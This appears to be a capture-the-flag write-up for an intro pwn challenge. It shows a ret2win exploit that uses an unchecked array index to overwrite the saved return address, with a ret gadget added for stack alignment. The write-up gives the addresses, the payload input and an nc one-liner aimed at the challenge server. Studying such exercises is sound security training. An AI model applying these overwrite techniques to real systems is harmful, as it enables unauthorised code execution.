# Address Holds Key - Writeup

## Challenge

**Files provided:** `vuln`, `Dockerfile`  
**Remote:** `nc 34.131.141.163 19236`

## TL;DR

This binary has an out-of-bounds stack write through an unchecked array index. Because the binary is not PIE and already contains a `print_flag()` function, we can overwrite the saved return address and bounce into `print_flag()`.

The only extra wrinkle is stack alignment: a direct return into `print_flag()` crashes, so we return to a plain `ret` gadget first and then into `print_flag()`.

## Binary Recon

Basic checks:

```bash
file vuln
checksec --file=./vuln
```

Important results:

- `amd64`
- `NX enabled`
- `No PIE`
- `No canary`
- `Partial RELRO`
- binary is **not stripped**

Strings and symbols immediately reveal a useful function:

```text
flag.txt
print_flag
How many times you want to change the array
Indices allowed btw. 0 to 9
```

## Relevant Functions

### `print_flag()`

The binary already contains a function that opens `flag.txt` and prints it byte-by-byte.

### `main()`

Disassembly shows the bug:

```c
int arr[10];
int times;
int idx;

scanf("%d", &times);

for (int i = 0; i < times; i++) {
    puts("Indices allowed btw. 0 to 9");
    scanf("%d", &idx);
    puts("Value: ");
    scanf("%d", &arr[idx]);
}
```

There is no bounds check on `idx`, so `arr[idx]` can write outside the local array and into the saved stack frame.

## Stack Layout

From the disassembly:

- `times` is at `rbp-0x38`
- `idx` is at `rbp-0x34`
- `arr` starts at `rbp-0x30`

Since each array entry is a 4-byte `int`, these offsets matter:

- `arr[14]` writes to `rbp+0x8`  -> lower 4 bytes of saved RIP
- `arr[15]` writes to `rbp+0xc`  -> upper 4 bytes of saved RIP
- `arr[16]` writes to `rbp+0x10` -> lower 4 bytes of the next qword on the stack
- `arr[17]` writes to `rbp+0x14` -> upper 4 bytes of that qword

## Why a Direct Return Fails

Directly replacing the saved RIP with `print_flag()` is close, but on amd64 the stack alignment is off when we `ret` into a function that expects to be reached via `call`.

The fix is simple:

1. return to a single `ret` gadget
2. let that `ret` pop one more 8-byte value
3. land in `print_flag()` with the correct alignment

## Gadgets and Targets

- `ret` gadget: `0x401016`
- `print_flag()`: `0x4011c9`

In decimal for `%d` input:

- `0x401016` -> `4198422`
- `0x4011c9` -> `4198857`

## Exploit Payload

We write both halves of both qwords to keep the chain clean:

```text
4
14
4198422
15
0
16
4198857
17
0
```

## Remote Solve

One-liner:

```bash
printf "4\n14\n4198422\n15\n0\n16\n4198857\n17\n0\n" | nc 34.131.141.163 19236
```

## Flag

```text
kashiCTF{made_u_return_lol_N9XJh0GFxq}}
```

## Takeaway

This was a clean intro-style pwn challenge built around:

- unchecked stack indexing
- non-PIE code reuse
- a built-in win function
- amd64 stack alignment during ret2win
